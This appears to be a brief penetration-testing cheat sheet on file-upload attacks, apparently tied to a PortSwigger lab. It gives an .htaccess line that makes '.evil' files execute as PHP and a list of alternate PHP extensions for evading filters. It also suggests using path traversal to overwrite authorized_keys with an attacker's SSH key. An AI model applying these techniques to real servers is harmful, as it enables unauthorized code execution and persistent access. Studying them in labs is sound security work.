#### HTACCESS BYPASS

```
#Upload a custom .htaccess file. (https://br4ind3ad.medium.com/port-swigger-file-upload-vulnerability-lab-4-4c2bf39eeaf)
#This means all files with the extension evil with execute as PHP.
AddType application/x-httpd-php .evil
```

### Extension 

```
#Modify the original extension
eg. phps, pHp, php7, phtml.
```


### Over Writing
![[Pasted image 20231205204847.png]]

The response shows the ../../ indicating we may be able to overwrite files.

Create a SSH key and authroized_keys file.

![[Pasted image 20231205205001.png]]